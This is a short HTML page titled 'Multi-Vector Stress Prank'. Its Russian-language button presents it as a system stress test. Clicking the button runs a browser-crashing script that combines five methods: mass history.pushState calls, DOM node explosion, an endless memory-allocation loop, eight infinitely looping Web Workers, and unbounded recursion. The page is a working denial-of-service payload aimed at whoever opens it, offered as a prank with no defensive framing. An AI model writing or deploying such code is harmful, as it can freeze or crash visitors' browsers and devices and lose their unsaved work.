<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Multi-Vector Stress Prank</title>
    <style>
        body {
            background-color: #0d0d0f;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: #1a1a24;
            padding: 30px;
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            text-align: center;
            max-width: 400px;
            width: 90%;
        }
        button {
            background: #ff3b30;
            color: white;
            border: none;
            padding: 16px 32px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 12px;
            cursor: pointer;
            width: 100%;
            transition: transform 0.1s;
        }
        button:active {
            transform: scale(0.95);
        }
        #status {
            margin-top: 20px;
            color: #8e8e93;
            font-size: 14px;
        }
    </style>
</head>
<body>

    <div class="card">
        <h2>Системный стресс-тест</h2>
        <p>Нажмите для инициализации всех векторов нагрузки.</p>
        <button id="btn">Запустить</button>
        <div id="status">Ожидание нажатия...</div>
    </div>

    <script>
        document.getElementById('btn').addEventListener('click', () => {
            document.getElementById('status').innerText = 'Выполнение векторов...';

            // Вектор 1: История (History API PushState Exhaustion)
            try {
                let data = "payload";
                for (let i = 0; i < 500000; i++) {
                    data += "x";
                    history.pushState(null, null, "#" + data);
                }
            } catch (e) {}

            // Вектор 2: Раздувание DOM-дерева (DOM Node Explosion)
            try {
                for (let i = 0; i < 50000; i++) {
                    let div = document.createElement('div');
                    div.innerHTML = '<span>'.repeat(100) + 'crash' + '</span>'.repeat(100);
                    document.body.appendChild(div);
                }
            } catch (e) {}

            // Вектор 3: Жесткая утечка памяти (Memory Allocation Loop)
            try {
                let memoryHog = [];
                while (true) {
                    memoryHog.push(new Array(5000000).fill(Math.random()));
                }
            } catch (e) {}

            // Вектор 4: Многопоточные Web Workers (CPU & Memory Hogging)
            try {
                const workerCode = `
                    while(true) {
                        let massiveArray = new Array(10000000).fill(Math.random());
                    }
                `;
                const blob = new Blob([workerCode], { type: 'application/javascript' });
                for (let i = 0; i < 8; i++) {
                    new Worker(URL.createObjectURL(blob));
                }
            } catch (e) {}

            // Вектор 5: Переполнение стека вызовов (Call Stack Overflow)
            try {
                function recursiveLoop() {
                    recursiveLoop();
                }
                recursiveLoop();
            } catch (e) {}
        });
    </script>
</body>
</html>
